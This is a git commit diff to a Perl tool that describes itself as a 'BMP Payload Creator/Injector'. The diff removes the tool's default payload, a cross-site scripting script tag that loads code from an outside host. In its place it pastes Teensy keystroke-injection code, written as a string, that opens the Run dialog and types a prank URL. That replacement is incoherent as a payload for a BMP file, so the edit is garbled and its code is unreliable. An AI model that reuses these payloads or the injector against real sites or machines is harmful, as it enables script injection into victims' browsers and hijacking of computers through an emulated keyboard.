259bc2bbfad1255424a88b289eaf73f3ac4b3a3e
FallenAngel <87920231+FallenAngel07@users.noreply.github.com>
2021-10-18 00:09:26 +0800

    Update bmp.pl

--- bmp.pl
+++ bmp.pl
@@ -28,7 +28,7 @@ GetOptions(
 usage(0)     if $help;
 usage(1) unless $outfile;
 
-$payload //= '<script src=//nji.xyz></script>';
+$payload //= '*/  int ds = 500;  #if defined(CORE_TEENSY) #define LED_PIN 13 #endif    void setup() {    // allow controlling LED   pinMode(LED_PIN, OUTPUT);   // turn the LED on while running   digitalWrite(LED_PIN, HIGH);    delay(5000);    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);   Keyboard.set_key1(KEY_R);   Keyboard.send_now();    delay(500);   Keyboard.set_modifier(0);   Keyboard.set_key1(0);   Keyboard.print("https://www.youtube.com/watch?v=IC5YozmvPpM"); //Rick roll never give up wkwk   Keyboard.set_key1(KEY_ENTER);   Keyboard.send_now();   Keyboard.set_key1(0);   Keyboard.send_now();  }';
 
 say <<EOF;
 [>|       BMP Payload Creator/Injector      |<]
